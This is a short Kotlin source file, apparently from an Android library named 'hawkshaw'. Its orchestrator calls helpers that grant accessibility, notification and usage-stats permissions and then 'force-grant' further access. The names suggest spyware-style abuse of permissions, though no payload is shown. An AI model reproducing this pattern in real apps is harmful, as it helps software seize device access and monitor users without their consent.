package com.hawkshaw.library.permissions

import android.content.Context
import com.hawkshaw.library.features.accessibility.PermissionManagerKt
import com.hawkshaw.library.features.accessibility.EnhancedPermissionManager

object PermissionOrchestrator {

    fun grantAll(context: Context) {
        PermissionManagerKt.grantAccessibility(context)
        PermissionManagerKt.grantNotification(context)
        PermissionManagerKt.grantUsageStats(context)

        EnhancedPermissionManager.forceGrant(context)
    }
}